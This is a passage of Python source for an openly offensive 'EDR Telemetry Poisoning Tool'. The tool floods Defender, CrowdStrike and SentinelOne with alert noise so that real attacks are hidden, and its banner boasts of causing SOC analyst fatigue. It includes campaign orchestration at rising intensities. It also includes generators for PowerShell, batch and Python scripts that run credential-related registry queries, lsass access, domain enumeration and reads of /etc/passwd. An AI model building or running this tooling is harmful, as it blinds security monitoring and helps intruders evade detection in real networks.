                    timestamp=datetime.now() + timedelta(seconds=random.randint(0, 60)),
                    process_name=raw_event.get("process", "unknown.exe"),
                    command_line=raw_event.get("command_line", ""),
                    parent_process=raw_event.get("parent", "explorer.exe"),
                    target_file=raw_event.get("original_file") or raw_event.get("file_path"),
                    target_registry=raw_event.get("registry_key"),
                    network_connection=raw_event.get("network"),
                    severity=raw_event.get("severity", "medium"),
                    mitre_technique=raw_event.get("mitre", ""),
                    description=raw_event.get("description", "")
                )
                events.append(event)
        
        # Shuffle and limit
        random.shuffle(events)
        return events[:target_count]
    
    def generate_cover_noise(
        self,
        real_attack_category: NoiseCategory,
        cover_ratio: float = 10.0
    ) -> List[NoiseEvent]:
        """
        Generate noise to cover a real attack.
        For every real attack event, generate 'cover_ratio' fake events.
        """
        # Select unrelated categories for cover noise
        all_categories = list(NoiseCategory)
        cover_categories = [c for c in all_categories if c != real_attack_category]
        
        # Generate noise in random categories
        selected_categories = random.sample(cover_categories, min(5, len(cover_categories)))
        
        return self.generate_noise_burst(
            categories=selected_categories,
            intensity=IntensityLevel.HIGH
        )
    
    def generate_timed_campaign(
        self,
        campaign: PoisonCampaign,
        callback: callable = None
    ) -> Generator[List[NoiseEvent], None, None]:
        """Generate noise events over time for a campaign"""
        start_time = datetime.now()
        end_time = start_time + timedelta(minutes=campaign.duration_minutes)
        
        # Calculate events per minute based on intensity
        events_per_minute = {
            IntensityLevel.LOW: 30,
            IntensityLevel.MEDIUM: 125,
            IntensityLevel.HIGH: 350,
            IntensityLevel.EXTREME: 750,
        }
        
        target_epm = events_per_minute[campaign.intensity]
        
        while datetime.now() < end_time:
            # Generate burst
            events = self.generate_noise_burst(
                categories=campaign.categories,
                intensity=campaign.intensity,
                target_edr=campaign.target_edr
            )
            
            campaign.events_generated += len(events)
            
            if callback:
                callback(events)
            
            yield events
            
            # Wait based on intensity
            sleep_time = 60 / (target_epm / len(events)) if events else 1
            time.sleep(min(sleep_time, 5))
        
        campaign.status = "completed"


# ============================================================================
# EDR Poison API
# ============================================================================

class EDRPoisonAPI:
    """Main API for EDR telemetry poisoning"""
    
    def __init__(self):
        self.orchestrator = AINoiseOrchestrator()
        self.active_campaigns: Dict[str, PoisonCampaign] = {}
        self.campaign_threads: Dict[str, threading.Thread] = {}
        self.generated_events: List[NoiseEvent] = []
        self._lock = threading.Lock()
    
    def create_campaign(
        self,
        name: str,
        target_edr: str = "generic",
        intensity: str = "medium",
        categories: List[str] = None,
        duration_minutes: int = 30
    ) -> Dict:
        """Create a new poisoning campaign"""
        try:
            # Parse parameters
            edr_vendor = EDRVendor(target_edr.lower())
        except ValueError:
            edr_vendor = EDRVendor.GENERIC
        
        try:
            intensity_level = IntensityLevel[intensity.upper()]
        except KeyError:
            intensity_level = IntensityLevel.MEDIUM
        
        # Parse categories
        if categories:
            noise_categories = []
            for cat in categories:
                try:
                    noise_categories.append(NoiseCategory(cat.lower()))
                except ValueError:
                    pass
        else:
            noise_categories = list(NoiseCategory)
        
        # Generate campaign ID
        campaign_id = f"POISON-{hashlib.md5(f'{name}{time.time()}'.encode()).hexdigest()[:8].upper()}"
        
        campaign = PoisonCampaign(
            campaign_id=campaign_id,
            name=name,
            target_edr=edr_vendor,
            intensity=intensity_level,
            categories=noise_categories,
            duration_minutes=duration_minutes,
            status="created"
        )
        
        self.active_campaigns[campaign_id] = campaign
        
        return {
            "success": True,
            "campaign": campaign.to_dict(),
            "message": f"Campaign '{name}' created with ID {campaign_id}"
        }
    
    def start_campaign(self, campaign_id: str) -> Dict:
        """Start a poisoning campaign"""
        if campaign_id not in self.active_campaigns:
            return {"success": False, "error": "Campaign not found"}
        
        campaign = self.active_campaigns[campaign_id]
        
        if campaign.status == "running":
            return {"success": False, "error": "Campaign already running"}
        
        campaign.status = "running"
        campaign.start_time = datetime.now()
        
        def run_campaign():
            for events in self.orchestrator.generate_timed_campaign(campaign):
                with self._lock:
                    self.generated_events.extend(events)
        
        thread = threading.Thread(target=run_campaign, daemon=True)
        thread.start()
        self.campaign_threads[campaign_id] = thread
        
        return {
            "success": True,
            "campaign_id": campaign_id,
            "status": "running",
            "message": f"Campaign started - will run for {campaign.duration_minutes} minutes"
        }
    
    def stop_campaign(self, campaign_id: str) -> Dict:
        """Stop a running campaign"""
        if campaign_id not in self.active_campaigns:
            return {"success": False, "error": "Campaign not found"}
        
        campaign = self.active_campaigns[campaign_id]
        campaign.status = "stopped"
        
        return {
            "success": True,
            "campaign_id": campaign_id,
            "events_generated": campaign.events_generated,
            "message": "Campaign stopped"
        }
    
    def get_campaign_status(self, campaign_id: str) -> Dict:
        """Get campaign status"""
        if campaign_id not in self.active_campaigns:
            return {"success": False, "error": "Campaign not found"}
        
        campaign = self.active_campaigns[campaign_id]
        return {
            "success": True,
            "campaign": campaign.to_dict()
        }
    
    def list_campaigns(self) -> Dict:
        """List all campaigns"""
        return {
            "success": True,
            "campaigns": [c.to_dict() for c in self.active_campaigns.values()],
            "total": len(self.active_campaigns)
        }
    
    def generate_instant_noise(
        self,
        categories: List[str] = None,
        intensity: str = "medium",
        target_edr: str = "generic"
    ) -> Dict:
        """Generate instant noise burst"""
        # Parse categories
        if categories:
            noise_categories = []
            for cat in categories:
                try:
                    noise_categories.append(NoiseCategory(cat.lower()))
                except ValueError:
                    pass
        else:
            noise_categories = [NoiseCategory.DISCOVERY, NoiseCategory.CREDENTIAL_ACCESS]
        
        try:
            intensity_level = IntensityLevel[intensity.upper()]
        except KeyError:
            intensity_level = IntensityLevel.MEDIUM
        
        try:
            edr_vendor = EDRVendor(target_edr.lower())
        except ValueError:
            edr_vendor = EDRVendor.GENERIC
        
        events = self.orchestrator.generate_noise_burst(
            categories=noise_categories,
            intensity=intensity_level,
            target_edr=edr_vendor
        )
        
        with self._lock:
            self.generated_events.extend(events)
        
        return {
            "success": True,
            "events_generated": len(events),
            "events": [e.to_dict() for e in events[:50]],  # Return first 50
            "categories": [c.value for c in noise_categories],
            "intensity": intensity_level.name
        }
    
    def get_edr_specific_payload(self, edr: str, category: str) -> Dict:
        """Get EDR-specific noise patterns"""
        patterns = {
            "defender": EDRNoisePatterns.DEFENDER_TRIGGERS,
            "crowdstrike": EDRNoisePatterns.CROWDSTRIKE_TRIGGERS,
            "sentinelone": EDRNoisePatterns.SENTINELONE_TRIGGERS,
        }
        
        edr_patterns = patterns.get(edr.lower(), {})
        category_patterns = edr_patterns.get(category.lower(), [])
        
        return {
            "success": True,
            "edr": edr,
            "category": category,
            "patterns": category_patterns,
            "count": len(category_patterns)
        }
    
    def get_statistics(self) -> Dict:
        """Get poisoning statistics"""
        with self._lock:
            events = self.generated_events
        
        # Count by category
        category_counts = {}
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        
        for event in events:
            cat = event.category.value
            category_counts[cat] = category_counts.get(cat, 0) + 1
            severity_counts[event.severity] = severity_counts.get(event.severity, 0) + 1
        
        return {
            "success": True,
            "total_events": len(events),
            "by_category": category_counts,
            "by_severity": severity_counts,
            "active_campaigns": len([c for c in self.active_campaigns.values() if c.status == "running"]),
            "total_campaigns": len(self.active_campaigns)
        }
    
    def export_events(self, format: str = "json") -> str:
        """Export generated events"""
        with self._lock:
            events = [e.to_dict() for e in self.generated_events]
        
        if format == "json":
            return json.dumps(events, indent=2)
        elif format == "csv":
            if not events:
                return "No events"
            
            headers = list(events[0].keys())
            lines = [",".join(headers)]
            for event in events:
                line = ",".join(str(event.get(h, "")) for h in headers)
                lines.append(line)
            return "\n".join(lines)
        else:
            return json.dumps(events)
    
    def clear_events(self) -> Dict:
        """Clear all generated events"""
        with self._lock:
            count = len(self.generated_events)
            self.generated_events.clear()
        
        return {
            "success": True,
            "cleared": count,
            "message": f"Cleared {count} events"
        }


# ============================================================================
# Script Generator for Real Execution
# ============================================================================

class NoiseScriptGenerator:
    """Generate executable scripts for noise generation"""
    
    @staticmethod
    def generate_powershell_noise(category: NoiseCategory) -> str:
        """Generate PowerShell script for noise"""
        scripts = {
            NoiseCategory.DISCOVERY: '''
# Discovery Noise Generator
$ErrorActionPreference = "SilentlyContinue"

# Enumeration commands that trigger alerts
whoami /all
net user /domain
net group "Domain Admins" /domain
net localgroup administrators
nltest /dclist:$env:USERDNSDOMAIN
Get-ADComputer -Filter * -Properties * | Out-Null
Get-ADUser -Filter * | Out-Null
Get-ADGroup -Filter * | Out-Null
ipconfig /all
netstat -ano
systeminfo
tasklist /v
cmdkey /list

Write-Host "[+] Discovery noise generated"
''',
            NoiseCategory.CREDENTIAL_ACCESS: '''
# Credential Access Noise (SIMULATED - No actual creds stolen)
$ErrorActionPreference = "SilentlyContinue"

# These commands will trigger alerts but won't actually work without privileges
try { reg query HKLM\SAM } catch {}
try { reg query HKLM\SECURITY } catch {}
try { reg query HKLM\SYSTEM } catch {}

# Fake LSASS access attempt (will fail but trigger alert)
Get-Process lsass -ErrorAction SilentlyContinue | Out-Null

# Kerberos enumeration (benign but triggers alerts)
setspn -Q */* 2>$null | Out-Null
klist tickets 2>$null | Out-Null

Write-Host "[+] Credential access noise generated"
''',
            NoiseCategory.DEFENSE_EVASION: '''
# Defense Evasion Noise (SIMULATED - Requires admin, will mostly fail)
$ErrorActionPreference = "SilentlyContinue"

# Try to query Defender settings (triggers alert)
Get-MpPreference -ErrorAction SilentlyContinue | Out-Null

# Query security services (benign but logged)
Get-Service WinDefend,Sense,WdNisSvc -ErrorAction SilentlyContinue | Out-Null

# Event log query (triggers monitoring)
wevtutil qe Security /c:1 /f:text 2>$null | Out-Null

Write-Host "[+] Defense evasion noise generated"
''',
        }
        
        return scripts.get(category, "# No script for this category")
    
    @staticmethod
    def generate_batch_noise() -> str:
        """Generate batch script for Windows noise"""
        return '''@echo off
REM EDR Noise Generator - Batch Script
REM This triggers various EDR alerts with benign commands

echo [*] Starting noise generation...

REM Discovery noise
whoami /all >nul 2>&1
net user /domain >nul 2>&1
net group "Domain Admins" /domain >nul 2>&1
ipconfig /all >nul 2>&1
netstat -ano >nul 2>&1
systeminfo >nul 2>&1
tasklist /v >nul 2>&1

REM Registry queries (triggers alerts)
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run >nul 2>&1
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run >nul 2>&1

REM Network enumeration
arp -a >nul 2>&1
nbtstat -n >nul 2>&1
route print >nul 2>&1
net view /domain >nul 2>&1

echo [+] Noise generation complete
'''
    
    @staticmethod
    def generate_python_noise() -> str:
        """Generate Python script for cross-platform noise"""
        return '''#!/usr/bin/env python3
"""
EDR Noise Generator - Python Script
Generates benign telemetry that triggers EDR alerts
"""
import os
import socket
import subprocess
import platform

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
    except:
        pass

def generate_discovery_noise():
    """Generate discovery/enumeration noise"""
    print("[*] Generating discovery noise...")
    
    if platform.system() == "Windows":
        commands = [
            "whoami /all",
            "net user",
            "net localgroup administrators", 
            "ipconfig /all",
            "netstat -ano",
            "systeminfo",
            "tasklist /v",
            "arp -a",
        ]
    else:
        commands = [
            "whoami",
            "id",
            "cat /etc/passwd",
            "ifconfig -a",
            "netstat -tulpn",
            "uname -a",
            "ps aux",
        ]
    
    for cmd in commands:
        run_cmd(cmd)
    
    print("[+] Discovery noise complete")

def generate_network_noise():
    """Generate suspicious network activity"""
    print("[*] Generating network noise...")
    
    # DNS lookups to suspicious-looking domains (legitimate services)
    domains = [
        "cdn.example.com",
        "api.github.com",
        "update.microsoft.com",
    ]
    
    for domain in domains:
        try:
            socket.gethostbyname(domain)
        except:
            pass
    
    print("[+] Network noise complete")

if __name__ == "__main__":
    print("="*50)
    print("EDR Noise Generator")
    print("="*50)
    generate_discovery_noise()
    generate_network_noise()
    print("\\n[+] All noise generation complete")
'''


# ============================================================================
# Module initialization
# ============================================================================

# Global API instance
_edr_poison_api: Optional[EDRPoisonAPI] = None


def get_edr_poison_api() -> EDRPoisonAPI:
    """Get or create global EDR Poison API instance"""
    global _edr_poison_api
    if _edr_poison_api is None:
        _edr_poison_api = EDRPoisonAPI()
    return _edr_poison_api


# CLI interface
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="EDR Telemetry Poisoning Tool")
    parser.add_argument("--generate", action="store_true", help="Generate instant noise")
    parser.add_argument("--intensity", default="medium", choices=["low", "medium", "high", "extreme"])
    parser.add_argument("--category", default="discovery", help="Noise category")
    parser.add_argument("--edr", default="generic", help="Target EDR")
    parser.add_argument("--script", choices=["powershell", "batch", "python"], help="Generate executable script")
    
    args = parser.parse_args()
    
    api = get_edr_poison_api()
    
    # PRO Features Banner
    print("\n" + "=" * 60)
    print("[EDR POISON PRO]")
    try:
        from evasion.edr_poison_pro import get_pro_engines
        pro_engines = get_pro_engines()
        print("✓ AI Flood Timing Engine: ENABLED")
        print("✓ Carbon Black Signatures: ENABLED")
        print("✓ Elastic Security Patterns: ENABLED")
        print("✓ SOC Analyst Fatigue AI: ENABLED")
        print("\n[PRO] Rating: 10/10 - SOC Killer Mode")
    except ImportError:
        print("✗ PRO features not available")
    print("=" * 60 + "\n")
    
    if args.script:
        gen = NoiseScriptGenerator()
        if args.script == "powershell":
            print(gen.generate_powershell_noise(NoiseCategory.DISCOVERY))
        elif args.script == "batch":
            print(gen.generate_batch_noise())
        elif args.script == "python":
            print(gen.generate_python_noise())
    elif args.generate:
        result = api.generate_instant_noise(
            categories=[args.category],
            intensity=args.intensity,
            target_edr=args.edr
        )
        print(f"Generated {result['events_generated']} noise events")
        print(json.dumps(result, indent=2))
    else:
        print("EDR Telemetry Poisoning Tool")
        print("Use --help for options")
